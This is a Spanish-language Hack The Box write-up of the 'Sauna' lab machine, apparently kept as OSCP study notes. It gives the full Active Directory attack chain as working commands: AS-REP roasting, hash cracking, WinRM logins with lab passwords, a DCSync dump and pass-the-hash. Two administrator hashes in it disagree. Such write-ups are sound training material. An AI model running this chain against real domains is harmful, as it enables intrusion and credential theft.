---
tags:
  - type/writeup
  - asset/active-directory
  - env/windows
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/229
dificultad: Media
ip: 10.10.10.175
os: Windows
relacionados:
  - "[[Ldap Enumeration]]"
  - "[[Kerberos User Enumeration - Kerbrute]]"
  - "[[ASRepRoast Attack (GetNPUsers)]]"
  - "[[Cracking Hashes]]"
  - "[[AutoLogon Credentials]]"
  - "[[BloodHound - SharpHound.exe]]"
  - "[[DCSync Attack - Secretsdump]]"
  - "[[PassTheHash]]"
  - "[[Generación de listas de usuarios]]"
  - "[[username-anarchy]]"
---
# HackTheBox - Sauna

## Reconocimiento

Mi primer paso fue realizar un escaneo de puertos exhaustivo en la máquina objetivo para identificar todos los servicios expuestos. Utilicé `nmap` en dos fases: primero un escaneo rápido para descubrir todos los puertos abiertos y luego un escaneo más detallado sobre esos puertos para obtener información sobre las versiones y los scripts por defecto.
```Bash
sudo nmap -p- -sS --open --min-rate 3000 -vvv -n -Pn $(cat ip) -oG 01_Reconnaissance/tcpports

> nmap -sCV -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49675,49695,49715 $(cat ip) --version-all --script-timeout 30s -oN 01_Reconnaissance/sCV
```

Los resultados revelaron que la máquina es un controlador de dominio para el dominio `egotistical-bank.local`. Entre los puertos más interesantes se encontraban el **80 (HTTP)**, **389 (LDAP)** y **5985 (WinRM)**, indicando que se trata de un entorno Windows con Active Directory.

### Enumeración de servicios

Con la información del escaneo, procedí a enumerar los servicios clave.

- **LDAP**: Intenté realizar una enumeración contra LDAP usando `windapsearch`. Aunque los `anonymous binds` estaban permitidos, la consulta no devolvió ningún objeto de dominio útil. Un intento similar con `GetADUsers.py` de Impacket tampoco arrojó resultados.
- **SMB**: Usando `smbclient`, logré autenticarme anónimamente, pero no encontré ningún recurso compartido al que pudiera acceder.
    

Dado que los servicios de red tradicionales no me dieron una vía de entrada, centré mi atención en el servicio web del puerto 80.

### Enumeración Web

Al navegar al sitio web, me encontré con la página de un banco. Un análisis rápido con Wappalyzer no reveló ninguna tecnología o framework vulnerable. Decidí buscar directorios y archivos ocultos con `ffuf`, pero los resultados fueron rutas comunes sin nada de interés.

Sin embargo, al revisar manualmente el sitio, encontré una página `about.html`. En esta página, había una sección de "Nuestro Equipo" que listaba los nombres completos de varios empleados. ¡Esta fue mi primera pista importante!

Teniendo nombres completos, podía generar una lista de posibles nombres de usuario. Para ello, utilicé la herramienta `username-anarchy` para crear permutaciones comunes (como `fsmith`, `F.Smith`, `smithf`, etc.).
```Bash
./username-anarchy --input-file fullnames.txt --select-format first,flast,first.last,firstl > unames.txt
```

Con esta lista de usuarios potenciales, estaba listo para buscar una debilidad en la configuración de autenticación del dominio.

---

## Explotación de vulnerabilidades

### AS-REP Roasting

Mi siguiente objetivo fue comprobar si alguna de las cuentas de usuario generadas tenía deshabilitada la pre-autenticación de Kerberos.

> [!ATTENTION] ¿Qué es AS-REP Roasting?
> 
> La pre-autenticación de Kerberos es una medida de seguridad que obliga a un usuario a demostrar que conoce su contraseña antes de que el Controlador de Dominio (KDC) le envíe un Ticket Granting Ticket (TGT). Si esta opción está deshabilitada para un usuario, un atacante puede solicitar un TGT para ese usuario sin proporcionar una contraseña. El KDC devolverá una porción del TGT cifrada con el hash NTLM de la contraseña del usuario. Este hash puede ser capturado y crackeado offline.

Utilicé el script `GetNPUsers.py` de Impacket en un bucle para iterar sobre mi lista de usuarios y solicitar TGTs para cada uno.
```Bash
impacket-GetNPUsers egotistical-bank.local/ -request -no-pass -usersfile unames.txt
```

El ataque fue exitoso. Obtuve un hash para el usuario `fsmith`.

### Cracking de Hash y Acceso Inicial

Con el hash en mi poder, era hora de crackearlo. Utilicé `hashcat` con el modo `18200`, que corresponde a `Kerberos 5 AS-REP etype 23`, y el famoso diccionario `rockyou.txt`.
```Bash
hashcat -m 18200 hash.txt -o pass.txt /usr/share/wordlists/rockyou.txt --force
```

En pocos segundos, `hashcat` reveló la contraseña.

> [!SUCCESS] Credenciales Obtenidas
> 
> - **Usuario**: `fsmith`
>     
> - **Contraseña**: `Thestrokes23`
>     

Ahora que tenía credenciales válidas y sabía que el puerto 5985 (WinRM) estaba abierto, me conecté a la máquina utilizando `evil-winrm`.
```Bash
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

El inicio de sesión fue exitoso. Rápidamente encontré y leí la flag de usuario en el escritorio de `Fsmith`.

---

## Escalada de privilegios

### Enumeración Interna con WinPEAS

Una vez dentro, necesitaba encontrar una forma de escalar privilegios. Subí el script `WinPEAS.exe` a la máquina víctima para automatizar la búsqueda de vectores de escalada comunes en sistemas Windows.

Al ejecutarlo, `WinPEAS` encontró un dato extremadamente valioso en el registro: credenciales de autologon.

> [!SUCCESS] Credenciales de Autologon Encontradas
> 
> El script reveló que el usuario svc_loanmgr estaba configurado para iniciar sesión automáticamente, y su contraseña estaba almacenada en texto plano.
> 
> - **Usuario**: `svc_loanmgr`
>     
> - **Contraseña**: `Moneymakestheworldgoround!`
>     

Verifiqué que este usuario también pertenecía al grupo `Remote Management Users`, por lo que podía usar sus credenciales para iniciar una nueva sesión de `evil-winrm`.
```Bash
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

### Mapeo de Privilegios con BloodHound

Con acceso como `svc_loanmgr`, mi siguiente paso fue entender qué privilegios tenía este usuario dentro del dominio. Para ello, usé **BloodHound**. Desde mi máquina, ejecuté el ingestor `bloodhound-python` para recolectar datos del Active Directory usando las nuevas credenciales.
```Bash
bloodhound-python -u svc_loanmgr -p Moneymakestheworldgoround! -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c All
```

Importé los datos en la GUI de BloodHound y ejecuté la consulta "Find Principals with DCSync Rights". El resultado fue claro: el usuario `svc_loanmgr` tenía el derecho extendido `DS-Replication-Get-Changes-All` sobre el dominio.

### DCSync y Pass-the-Hash

> [!danger] Privilegio DCSync
> 
> El privilegio DS-Replication-Get-Changes-All (comúnmente conocido como DCSync) es uno de los más críticos en Active Directory. Permite a una cuenta solicitar al Controlador de Dominio que replique información de directorio, incluyendo los hashes de las contraseñas de todos los usuarios, ¡incluido el del administrador del dominio!

Aprovechando este privilegio, utilicé `secretsdump.py` de Impacket para realizar un ataque DCSync y solicitar específicamente el hash NTLM del usuario `Administrator`.
```Bash
secretsdump.py egotistical-bank/svc_loanmgr@10.10.10.175 -just-dc-user Administrator
```

El script me devolvió el hash NTLM del administrador: `d9485863c1e9e05851aa40cbb4ab9dff`.

Con este hash, no necesitaba la contraseña en texto plano. Pude realizar un ataque **Pass-the-Hash** usando `psexec.py` para obtener una shell en el sistema con los máximos privilegios.
```Bash
psexec.py egotistical-bank.local/administrator@10.10.10.175 -hashes aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff
```
o con `evil-winrm`:
```bash
evil-winrm -i $(cat ip) -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
```

¡Éxito! Obtuve una shell como `NT AUTHORITY\SYSTEM`. Solo me quedaba navegar al escritorio del Administrador para leer la flag de root.


---

## Bandera(s)

> [!flag] `flag{user}`
> ce75957ca5ccb1fd25c441a9b89d7425
^bandera-user

> [!flag] `flag{root}`
>182a5c041f94518654f72ac863523b6d
^bandera-root
